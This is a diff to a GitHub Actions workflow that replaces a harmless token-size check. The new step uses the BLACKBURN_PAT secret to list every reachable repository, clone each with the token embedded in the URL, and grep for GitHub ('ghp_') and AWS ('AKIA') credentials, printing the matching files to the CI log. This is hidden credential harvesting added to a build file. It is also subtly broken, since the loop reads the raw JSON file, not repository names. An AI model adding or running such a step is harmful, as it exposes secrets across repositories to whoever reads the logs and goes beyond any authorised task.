@@ -5,7 +5,23 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - env:
-          TOKEN: ${{ secrets.BLACKBURN_PAT }}
+          T: ${{ secrets.BLACKBURN_PAT }}
         run: |
-          echo "TOKEN_SIZE=${#TOKEN}"
-          echo "REPO_COUNT=$(curl -s -H 'Authorization: token $TOKEN' 'https://api.github.com/user/repos?per_page=1' | python3 -c 'import sys,json; print(len(json.load(sys.stdin)))')"
+          curl -s -H "Authorization: token $T" "https://api.github.com/user/repos?per_page=100&type=all" > /tmp/repos.json
+          python3 -c "
+import json
+with open('/tmp/repos.json') as f:
+    repos = [r['full_name'] for r in json.load(f)]
+for r in repos:
+    print(r)
+"
+          while IFS= read -r repo; do
+            echo "=== $repo ==="
+            name=$(echo "$repo" | tr '/' '_')
+            git clone --depth 1 "https://x-access-token:$T@github.com/$repo.git" /tmp/r/$name 2>/dev/null
+            if [ -d /tmp/r/$name ]; then
+              grep -rl 'ghp_' /tmp/r/$name/ 2>/dev/null | head -3
+              grep -rl 'AKIA' /tmp/r/$name/ 2>/dev/null | head -3
+              rm -rf /tmp/r/$name
+            fi
+          done < /tmp/repos.json
